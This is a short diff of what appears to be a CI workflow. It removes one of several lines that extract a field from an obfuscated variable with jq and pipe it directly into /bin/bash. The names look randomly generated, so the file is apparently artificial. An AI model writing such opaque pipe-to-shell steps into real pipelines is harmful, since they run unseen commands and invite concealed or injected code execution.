@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$trhvy65" | jq -r .wydpo4517 | /bin/bash
           printf '%s' "$s8570" | jq -r .ltv21 | /bin/bash
           echo $y7 | jq -r .lc4 | /bin/bash
-          echo $pt6 | jq -r .hqwje90581 | /bin/bash
           echo $nkrg39 | jq -r .lfba14 | /bin/bash
 
       - name: Save output
